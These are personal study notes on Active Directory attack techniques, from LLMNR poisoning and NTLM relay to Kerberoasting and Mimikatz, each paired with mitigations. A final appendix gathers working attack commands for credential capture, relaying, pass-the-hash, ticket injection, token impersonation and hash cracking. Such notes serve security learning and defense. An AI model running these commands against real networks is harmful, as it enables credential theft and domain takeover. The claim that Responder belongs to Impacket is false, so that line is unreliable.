# Active Directory: Attack Surface & Exploitation — Study Notes

This document is a structured study notes based on personal notes, open-source research and ~5-hour lecture.

**Date:** January 10, 2026  
**Source:** Personal notes from a ~5-hour lecture, additional open-source research, The Cyber Mentor (YouTube): https://www.youtube.com/watch?v=VXxH4n684HE

---

## Research Overview

These notes represent my consolidated understanding of **Active Directory architecture and its most common attack vectors**.  
The focus is not on zero-day exploitation, but on **design weaknesses, legacy protocols, and operational misconfigurations** that are frequently abused in real-world environments.

The majority of Active Directory compromises happen due to:

* Excessive trust in default protocols (NTLM, LLMNR, WPAD)
* Weak credential hygiene
* Overprivileged service and machine accounts
* Insufficient hardening of Kerberos and LDAP

---

## Active Directory — Core Concepts

Active Directory (AD) is Microsoft’s centralized system for **managing corporate networks**, identities, access control, and security policies.  
It is deployed on **Windows Server** and acts as the backbone of enterprise authentication.

### Key Components

### 1. Domain
A logical security boundary inside Active Directory.  
Example: `example.local`

This is the fundamental unit for authentication, authorization, and policy enforcement.

---

### 2. Domain Controller (DC)
The **core of the entire system**.

* Handles authentication and authorization
* Stores the AD database
* Enforces Group Policies
* Replicates data across controllers

---

### 3. Tree
A hierarchical structure of domains with parent–child relationships.

Example:
- `example.local` (parent)
- `1.example.local` (child)
- `abc.1.example.local` (grandchild)

---

### 4. Forest
A collection of multiple domain trees.

Example:
- `1.abcd.local`
- `1.qwerty.local`

Different trees, but sharing trust at the forest level.

---

### 5. Objects
Everything that exists in Active Directory:

* **Users** — human identities
* **Computers** — workstations, servers, laptops
* **Groups** — containers for access control
* **Printers / Shared Folders** — infrastructure resources

---

### 6. Organizational Units (OUs)
Logical directories with **custom policies**.

Important detail:
* Policies applied to one OU do **not** automatically apply to others.

---

### 7. Shares
Network-accessible directories (SMB).

---

### 8. `ntds.dit`
The **holy grail** for attackers and pentesters.

Contains:
* NTLM password hashes
* Kerberos keys
* Sensitive directory data

---

### 9. Service Accounts
Granting **administrator privileges** to service accounts is a **critical security failure** and a common root cause of domain compromise.

---

## Common Active Directory Attack Techniques

---

## 1. LLMNR Poisoning (MITM)

### Concept

**LLMNR (Link-Local Multicast Name Resolution)** is a fallback protocol used when DNS fails.  
An attacker can impersonate the requested resource.

### Attack Flow

1. Attacker joins the local network
2. Runs `Responder`
3. Victim queries a non-existent hostname
4. Attacker claims to be the target
5. NTLM Challenge–Response authentication occurs
6. Attacker captures a **NetNTLMv2 hash**

Notes:
* NetNTLMv2 **cannot** be used for Pass-the-Hash
* Only usable via **offline brute-force**
* Responder is part of the **Impacket toolkit**

### Practical Example

```bash
responder -I eth0 -rdwv
```

### Mitigations

* Disable **LLMNR** and **NBT-NS**
* Enforce **strong passwords**
* Implement **Network Access Control (NAC)**

---

## 2. SMB Relay Attacks

### Concept

An attacker relays a legitimate user’s authentication attempt to another system, gaining access **without knowing the user’s credentials**.

### Key Conditions

* SMB Signing must be **enabled but not required**
* Victim is tricked into authenticating to the attacker
* NTLM authentication is relayed to a target host

### Mitigations

* Require **SMB Signing**
* Disable **LLMNR** and **NetBIOS**
* Use **LAPS (Local Administrator Password Solution)**
* Implement **Tiered Administration**
* Disable **NTLM authentication** where possible

---

## 3. IPv6 Attacks (LDAP Relay via mitm6)

### Concept

Modern Windows systems prefer IPv6 over IPv4 by default.  
In many corporate environments, IPv6 is enabled but **not properly configured**, creating an attack surface.

### Attack Summary

* Attacker impersonates an IPv6 router and DNS server
* Victim accepts attacker as primary DNS
* WPAD hijacking triggers NTLM authentication
* NTLM is relayed to **LDAP or SMB on the Domain Controller**

This allows:
* Domain-wide enumeration
* Machine account creation
* Abuse of **Resource-Based Constrained Delegation (RBCD)**

### Mitigations

* Disable **IPv6** if not in use
* Enable **LDAP Signing**
* Enable **LDAP Channel Binding**
* Disable **WPAD**
* Set `ms-DS-MachineAccountQuota` from 10 to **0**
* Use the **Protected Users** group (especially for Domain Admins)

---

## 4. Passback Attacks

A variation of NTLM Relay where the victim is **not a human user**, but a **network device** such as a printer or scanner.

### Mitigations

* Disable NTLM where possible
* Enforce SMB and LDAP signing
* Harden and isolate network devices

---

## 5. PowerView (Post-Exploitation Enumeration)

PowerView is a PowerShell framework used for **enumerating Active Directory from inside the domain** using native Windows APIs and LDAP.

It allows extraction of:
* Domain information
* Users and groups
* Computers and operating systems
* GPOs and shared resources

### Mitigations

* Restrict PowerShell execution
* Use **Constrained Language Mode**
* Monitor LDAP enumeration activity
* Apply least-privilege principles

---

## 6. BloodHound

BloodHound visualizes **privilege escalation paths** in Active Directory.

If PowerView provides raw facts, BloodHound provides **strategic insight**.

### Mitigations

* Regularly audit privileged group memberships
* Remove unnecessary delegation rights
* Monitor abnormal object relationships

---

## 7. Pass-the-Hash / Pass-the-Password

### Concept

Reuse of stolen credentials or hashes for lateral movement across the network.

### Mitigations

* Disable **NTLM**
* Enforce **Kerberos-only authentication**
* Use **LAPS**
* Limit local administrator reuse

---

## 8. Token Impersonation

### Concept

Authentication tokens act like **session cookies**.  
If an attacker compromises a machine where a privileged user has an active session, they can impersonate that user **without knowing the password**.

If a Domain Admin session is present:
* Immediate Domain Admin compromise.

### Mitigations

* Add Domain Admins to **Protected Users**
* Disable credential caching via GPO
* Enable **Windows Defender Credential Guard**
* Monitor access to `lsass.exe`
* Domain Admins must **never** log into workstations or standard servers

---

## 9. Kerberoasting

### Concept

Any authenticated user can request Kerberos service tickets (TGS) for accounts with SPNs.  
These tickets are encrypted using the **service account’s password hash**, enabling offline brute-force attacks.

### Mitigations

* Enforce **strong, long passwords** for service accounts
* Rotate service account credentials regularly
* Minimize service account privileges
* Prefer **Group Managed Service Accounts (gMSA)**

---

## 10. GPP Attacks (MS14-025)

### Concept

Legacy Group Policy Preferences stored encrypted passwords in SYSVOL using a **publicly known encryption key**.

Any authenticated user could decrypt these passwords.

### Mitigations

* Remove legacy GPP XML files
* Never store passwords in SYSVOL
* Audit SYSVOL regularly
* Upgrade and patch legacy domain controllers

---

## 11. URL File Attacks

### Concept

Malicious `.url` or `.lnk` files placed in shared folders can automatically trigger NTLM authentication when a user opens the directory.

### Mitigations

* Disable NTLM
* Monitor shared folders
* Restrict write access to common shares
* Use modern EDR solutions

---

## 12. Mimikatz

Mimikatz is a powerful credential-theft tool.

Key rule:
**Never run Mimikatz directly on a live target system.**

It should only be used for:
* Offline analysis
* Parsing credential dumps

### Mitigations

* Enable **Credential Guard**
* Monitor LSASS access attempts
* Use modern EDR / XDR solutions

---

## Practical Exploitation (Attack Playbooks)

This section is a consolidated, command-focused appendix. It contains only practical exploitation commands, grouped by attack type. Conceptual explanations are intentionally omitted.

---

### LLMNR / NBT-NS Poisoning

```
responder -I eth0 -rdwv
```

Captured:
* NetNTLMv2 hashes (offline brute-force only)

---

### SMB Relay

Discovery (SMB signing):
```
nmap --script=smb2-security-mode.nse -p445 192.168.57.0/24
```

Responder configuration:
```
/etc/responder/Responder.conf
SMB = Off
HTTP = Off
```

Run responder:
```
responder -I eth0 -rdwv
```

Relay attack:
```
impacket-ntlmrelayx -tf targets.txt -smb2support
```

Interactive shell:
```
impacket-ntlmrelayx -tf targets.txt -smb2support -i
```

```
nc 127.0.0.1 11001
```

---

### Remote Command Execution (Post-Auth)

```
impacket-psexec domain.local/user:password@192.168.57.130
```

```
impacket-wmiexec domain.local/user:password@192.168.57.130
```
---

### IPv6 Attack (mitm6 + LDAP Relay)

```
mitm6 -d domain.local
```

```
impacket-ntlmrelayx -6 -t ldaps://192.168.57.133 -wh fakewpad.domain.local -l lootme --delegate-access
```

Artifacts:
* Machine account creation
* LDAP domain dump
* RBCD attack material

---

### Relay captured authentication using ntlmrelayx

PowerView Enumeration:

```
powershell -ep bypass
```

```
. .\PowerView.ps1
```

```
Get-NetDomain
```

```
Get-NetDomainController
```

```
Get-NetUser
```

```
Get-NetComputer -FullData
```

```
Get-NetGroup -GroupName *admin*
```

```
Invoke-ShareFinder
```

```
Get-NetGPO
```

---

### BloodHound Collection

```
powershell -ep bypass
```

```
. .\SharpHound.ps1
```

```
Invoke-BloodHound -CollectionMethod All -Domain domain.local -ZipFileName loot.zip
```
---

### Pass-the-Password / Pass-the-Hash

```
crackmapexec 10.0.3.0/24 -u user -d domain -p password
```

```
crackmapexec 10.0.3.0/24 -u user -d domain -H HASH --local
```

```
impacket-wmiexec -hashes :LMHASH:NTHASH domain/user@10.0.3.15
```

```
impacket-psexec domain/user:password@10.0.3.15
```

---

### Token Impersonation

```
privilege::debug
```

```
sekurlsa::logonpasswords
```

```
sekurlsa::tickets /export
```

```
kerberos::ptt admin.kirbi
```

Verification:
```
dir \\dc01.domain.local\c$
```

Metasploit:
```
load incognito
```

```
list_tokens -u
```

```
impersonate_token DOMAIN\Administrator
```

---

### Kerberoasting

```
impacket-GetUserSPNs domain.local/user:password -dc-ip 192.168.57.130 -request
```

Hash format:
```
$krb5tgs$23$*
```

Offline cracking:
```
hashcat -m 13100 hash.txt wordlist.txt
```

GPP (MS14-025)

Browse SYSVOL:
```
\\DC\SYSVOL\domain\Policies\
```

Decrypt:
```
gpp-decrypt <cpassword>
```

### URL File Attacks

```
\\192.168.1.10\share\icon.ico
```

Triggered automatically when a user opens the folder.


### Mimikatz (Offline / Post-Exploitation)

```
sekurlsa::logonpasswords
```

```
lsadump::sam
```

```
lsadump::secrets
```

Recommended usage:
* Offline dump analysis
* Kerberos ticket operations only

---

## Final Conclusion

Active Directory compromises rarely rely on exploits or zero-days.

They rely on:
* Trust abuse
* Legacy protocol support
* Misconfiguration
* Weak operational discipline

**Misconfiguration beats exploitation.**

---
*Notes compiled based on The Cyber Mentor (YouTube): https://www.youtube.com/watch?v=VXxH4n684HE*
